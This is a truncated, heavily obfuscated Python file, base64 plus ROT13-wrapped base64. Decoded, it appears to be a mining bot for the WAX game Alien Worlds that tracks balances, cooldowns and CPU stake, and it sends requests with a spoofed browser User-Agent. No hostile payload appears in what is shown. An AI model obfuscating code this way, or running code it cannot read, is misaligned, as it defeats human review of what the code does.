A9IGludChzZWxmLkRBVEFbJ2xvZyddWydsYXN0X2NwdV91c2FnZSddKQ0KICAgICAgICAgICAgICAgIGV4Y2VwdCAgICAgIDogcGFzcw0KICAgICAgICAgICAgICAgIHRyeSAgICAgICAgIDogREFUQUJBU0VbIHNlbGYuREFUQVsnd2F4aWQnXSBdWydiYWxhbmNlJ11bJ1RMTSddICAgICAgICAgICAgICA9IHNlbGYuREFUQVsnYmFsYW5jZSddLnNwbGl0KCcgJylbMF0NCiAgICAgICAgICAgICAgICBleGNlcHQgICAgICA6IHBhc3MNCiAgICAgICAgICAgICAgICB0cnkgICAgICAgICA6IERBVEFCQVNFWyBzZWxmLkRBVEFbJ3dheGlkJ10gXVsnYmFsYW5jZSddWydXQVgnXSAgICAgICAgICAgICAgPSBzZWxmLkRBVEFbJ2FjY291bnQnXVsnY29yZV9saXF1aWRfYmFsYW5jZSddLnNwbGl0KCcgJylbMF0NCiAgICAgICAgICAgICAgICBleGNlcHQgICAgICA6IHBhc3MNCiAgICAgICAgICAgICAgICB0cnkgICAgICAgICA6IERBVEFCQVNFWyBzZWxmLkRBVEFbJ3dheGlkJ10gXVsnY29vbGRvd24nXSAgICAgICAgICAgICAgICAgICAgPSAoDQogICAgICAgICAgICAgICAgICAgIHRpbWVkYXRlLnN0cnB0aW1lKA0KICAgICAgICAgICAgICAgICAgICAgICAgIyAgIHN0cih0aW1lZGF0ZS5ub3codHogPSBweXR6LnV0YykuYXN0aW1lem9uZSh0aW1lem9uZSgnVVMvUGFjaWZpYycpKSkuc3BsaXQoJy4nKVswXSwgDQogICAgICAgICAgICAgICAgICAgICAgICBzdHIodGltZWRhdGUubm93KCkpLnNwbGl0KCcuJylbMF0sIA0KICAgICAgICAgICAgICAgICAgICAgICAgIiVZLSVtLSVkICVIOiVNOiVTIg0KICAgICAgICAgICAgICAgICAgICApIC0gdGltZWRhdGUuc3RycHRpbWUoDQogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLkRBVEFbJ2xhc3RfbWluZSddWydsYXN0X3RpbWUnXS5zcGxpdCgnLicpWzBdLCANCiAgICAgICAgICAgICAgICAgICAgICAgICIlWS0lbS0lZFQlSDolTTolUyINCiAgICAgICAgICAgICAgICAgICAgKQ0KICAgICAgICAgICAgICAgICkuc2Vjb25kcw0KICAgICAgICAgICAgICAgIGV4Y2VwdCAgICAgIDogcGFzcw0KICAgICAgICAgICAgICAgIHRyeSAgICAgICAgIDogREFUQUJBU0VbIHNlbGYuREFUQVsnd2F4aWQnXSBdWyd3YXhhcGknXSAgICAgICAgICAgICAgICAgICAgICA9IHNlbGYuREFUQVsnd2F4c2VydmVyJ10NCiAgICAgICAgICAgICAgICBleGNlcHQgICAgICA6IHBhc3MNCiAgICAgICAgICAgICAgICB0cnkgICAgICAgICA6IERBVEFCQVNFWyBzZWxmLkRBVEFbJ3dheGlkJ10gXVsnY3B1J11bJ3N0YWtlJ10gICAgICAgICAgICAgICAgPSBmbG9hdChzZWxmLkRBVEFbJ2FjY291bnQnXVsndG90YWxfcmVzb3VyY2VzJ11bJ2NwdV93ZWlnaHQnXS5zcGxpdCgnICcpWzBdKSAtIDEuMA0KICAgICAgICAgICAgICAgIGV4Y2VwdCAgICAgIDogcGFzcw0KICAgICAgICAgICAgICAgIHRyeSAgICAgICAgIDogREFUQUJBU0VbIHNlbGYuREFUQVsnd2F4aWQnXSBdWydsYW5kJ10gICAgICAgICAgICAgICAgICAgICAgICA9IHNlbGYuREFUQVsibGFzdF9taW5lIl1bImN1cnJlbnRfbGFuZCJdDQogICAgICAgICAgICAgICAgZXhjZXB0ICAgICAgOiBwYXNzDQogICAgICAgICAgICAgICAgdHJ5ICAgICAgICAgOiBEQVRBQkFTRVsgc2VsZi5EQVRBWyd3YXhpZCddIF1bJ2RpZmZpY3VsdHknXSAgICAgICAgICAgICAgICAgID0gc2VsZi5EQVRBWyJkaWZmaWN1bHR5Il0NCiAgICAgICAgICAgICAgICBleGNlcHQgICAgICA6IHBhc3MNCiAgICAgICAgICAgICAgICB0cnkgICAgICAgICA6IERBVEFCQVNFWyBzZWxmLkRBVEFbJ3dheGlkJ10gXVsnbGFzdF9taW5lJ11bJ3RpbWUnXSAgICAgICAgICAgPSBzZWxmLkRBVEFbJ2xhc3RfbWluZSddWydsYXN0X3RpbWUnXS5zcGxpdCgnLicpWzBdDQogICAgICAgICAgICAgICAgZXhjZXB0ICAgICAgOiBwYXNzDQogICAgICAgICAgICAgICAgdHJ5ICAgICAgICAgOiBEQVRBQkFTRVsgc2VsZi5EQVRBWyd3YXhpZCddIF1bJ2xhc3RfbWluZSddWydtaW5lJ10gICAgICAgICAgID0gc2VsZi5EQVRBWydsb2cnXVsnbGFzdF90bG1fbWluZWQnXQ0KICAgICAgICAgICAgICAgIGV4Y2VwdCAgICAgIDogcGFzcw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICAgICAgICAgIHByaW50KCBmJ2VjaG8gRVJST1IgMjQ0IDoge2V9JyApDQogICAgICAgICAgICBmaW5hbGx5Og0KICAgICAgICAgICAgICAgIHRyeSAgICAgICAgIDogREFUQUJBU0VbIHNlbGYuREFUQVsnd2F4aWQnXSBdWyd0ZXh0J11bJ3N0ZXAnXSA9ICcwMCcgaWYgcmFuZG9tLnJhbmRyYW5nZSgxMDApID49IDgwIGFuZCBEQVRBQkFTRVsgc2VsZi5EQVRBWyd3YXhpZCddIF1bJ3RleHQnXVsnc3RlcCddID09ICcwMicgZWxzZSBEQVRBQkFTRVsgc2VsZi5EQVRBWyd3YXhpZCddIF1bJ3RleHQnXVsnc3RlcCddDQogICAgICAgICAgICAgICAgZXhjZXB0ICAgICAgOiBwYXNzDQogICAgICAgICAgICAgICAgdGltZS5zbGVlcCgyKQ0KICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgDQogICAgZGVmIGhvb2soDQogICAgICAgIHNlbGYNCiAgICApOg0KICAgICAgICANCiAgICAgICAgZ2xvYmFsIERBVEFCQVNFDQogICAgICAgIA0KICAgICAgICByZXR1cm4gc2VsZi5EQVRBDQogICAgZGVmIHRocmVhZCgNCiAgICAgICAgc2VsZg0KICAgICk6DQogICAgDQogICAgICAgIGdsb2JhbCBEQVRBQkFTRQ0KICAgICAgICBnbG9iYWwgVEhSRUFERVINCiAgICAgICAgDQogICAgICAgIFRIUkVBREVSWyBzZWxmLkRBVEFbJ3dheGlkJ10gXVsnc3RhdHVzJ10gICAgICAgID0gVHJ1ZQ0KICAgICAgICBUSFJFQURFUlsgc2VsZi5EQVRBWyd3YXhpZCddIF1bJ2dldF9hY2NvdW50J10gICA9IF90aHJlYWQuc3RhcnRfbmV3X3RocmVhZChzZWxmLmdldF9hY2NvdW50LCAoKSwgew0KICAgICAgICAgICAgJ2xvb3AnIDogVHJ1ZQ0KICAgICAgICB9KQ0KICAgICAgICBUSFJFQURFUlsgc2VsZi5EQVRBWyd3YXhpZCddIF1bJ2xvZ3MnXSAgICAgICAgICA9IF90aHJlYWQuc3RhcnRfbmV3X3RocmVhZChzZWxmLmxvZ3MsICgpKQ0KICAgICAgICBUSFJFQURFUlsgc2VsZi5EQVRBWyd3YXhpZCddIF1bJ29wZXJhdGUnXSAgICAgICA9IF90aHJlYWQuc3RhcnRfbmV3X3RocmVhZChzZWxmLm9wZXJhdGUsICgpKQ0KICAgICAgICBUSFJFQURFUlsgc2VsZi5EQVRBWyd3YXhpZCddIF1bJ2RhdGEnXSAgICAgICAgICA9IHNlbGYuREFUQQ0KICAgICAgICByZXR1cm4gVEhSRUFERVJbIHNlbGYuREFUQVsnd2F4aWQnXSBdWydzdGF0dXMnXQ0KICAgIGRlZiBvcGVyYXRlKA0KICAgICAgICBzZWxmDQogICAgKToNCiAgICAgICAgDQogICAgICAgIGdsb2JhbCBEQVRBQkFTRQ0KICAgICAgICBnbG9iYWwgVEhSRUFERVINCiAgICAgICAgDQogICAgICAgIHdoaWxlIFRydWU6DQoNCiAgICAgICAgICAgIHRyeSAgICAgICAgIDogREFUQUJBU0VbIHNlbGYuREFUQVsnd2F4aWQnXSBdWyd0ZXh0J11bJ3N0ZXAnXSA9ICcwMicNCiAgICAgICAgICAgIGV4Y2VwdCAgICAgIDogcGFzcw0KICAgICAgICANCiAgICAgICAgICAgIGlmIERBVEFCQVNFWyBzZWxmLkRBVEFbJ3dheGlkJ10gXVsnc3RhdCddID09IE5vbmU6DQogICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICB0cnkgICAgICAgICA6IERBVEFCQVNFWyBzZWxmLkRBVEFbJ3dheGlkJ10gXVsndGV4dCddWydzdGVwJ10gPSAnMDYnDQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdCAgICAgIDogcGFzcw0KICAgICAgICAgICAgICAgICAgICBzZWxmLmdldF9hY2NvdW50KGxvb3AgPSBGYWxzZSkNCiAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgICAgICAgICAgICAgIHByaW50KCBmJ19faW5pdF9fIEVSUk9SIDE2NCA6IHtlfScgKQ0KICAgICAgICAgICAgICAgICAgICByZXR1cm4NCiAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgIHNlbGYuZ2V0X2luZm9fYmFsYW5jZSgpDQogICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICAgICAgICAgICAgICBwcmludCggZidfX2luaXRfXyBFUlJPUiAxNjkgOiB7ZX0nICkNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuDQogICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICB0cnkgICAgICAgICA6IERBVEFCQVNFWyBzZWxmLkRBVEFbJ3dheGlkJ10gXVsndGV4dCddWydzdGVwJ10gPSAnMDgnDQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdCAgICAgIDogcGFzcw0KICAgICAgICAgICAgICAgICAgICBzZWxmLmdldF9pbmZvX2xhc3RfbWluZSgpDQogICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICAgICAgICAgICAgICBwcmludCggZidfX2luaXRfXyBFUlJPUiAxNzQgOiB7ZX0nICkNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuDQogICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICBzZWxmLmdldF9pbmZvX2F2YXRhcigpDQogICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICAgICAgICAgICAgICBwcmludCggZidfX2luaXRfXyBFUlJPUiAxNzkgOiB7ZX0nICkNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuDQogICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICB0cnkgICAgICAgICA6IERBVEFCQVNFWyBzZWxmLkRBVEFbJ3dheGlkJ10gXVsndGV4dCddWydzdGVwJ10gPSAnMDMnDQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdCAgICAgIDogcGFzcw0KICAgICAgICAgICAgICAgICAgICBzZWxmLmdldF9iYWdzKCkNCiAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgICAgICAgICAgICAgIHByaW50KCBmJ19faW5pdF9fIEVSUk9SIDE4NCA6IHtlfScgKQ0KICAgICAgICAgICAgICAgICAgICByZXR1cm4NCiAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgIHRyeSAgICAgICAgIDogREFUQUJBU0VbIHNlbGYuREFUQVsnd2F4aWQnXSBdWyd0ZXh0J11bJ3N0ZXAnXSA9ICcwNCcNCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0ICAgICAgOiBwYXNzDQogICAgICAgICAgICAgICAgICAgIHNlbGYuZ2V0X2xhbmQoKQ0KICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIGYnX19pbml0X18gRVJST1IgMTg5IDoge2V9JyApDQogICAgICAgICAgICAgICAgICAgIHJldHVybg0KICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgdHJ5ICAgICAgICAgOiBEQVRBQkFTRVsgc2VsZi5EQVRBWyd3YXhpZCddIF1bJ3RleHQnXVsnc3RlcCddID0gJzA3Jw0KICAgICAgICAgICAgICAgICAgICBleGNlcHQgICAgICA6IHBhc3MNCiAgICAgICAgICAgICAgICAgICAgc2VsZi5zZXRfZGlmZmljdWx0eSgpDQogICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICAgICAgICAgICAgICBwcmludCggZidfX2luaXRfXyBFUlJPUiAxOTQgOiB7ZX0nICkNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuDQogICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICBzZWxmLnNldF9jb29sZG93bigpDQogICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICAgICAgICAgICAgICBwcmludCggZidfX2luaXRfXyBFUlJPUiAxOTkgOiB7ZX0nICkNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuDQogICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICBzZWxmLmNoa19jcHUoKQ0KICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIGYnX19pbml0X18gRVJST1IgMjA0IDoge2V9JyApDQogICAgICAgICAgICAgICAgICAgIHJldHVybg0KICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgc2VsZi5nZXRfdHJhbnNhY3Rpb24oKQ0KICAgICAgICAgICAg'
#   love    = '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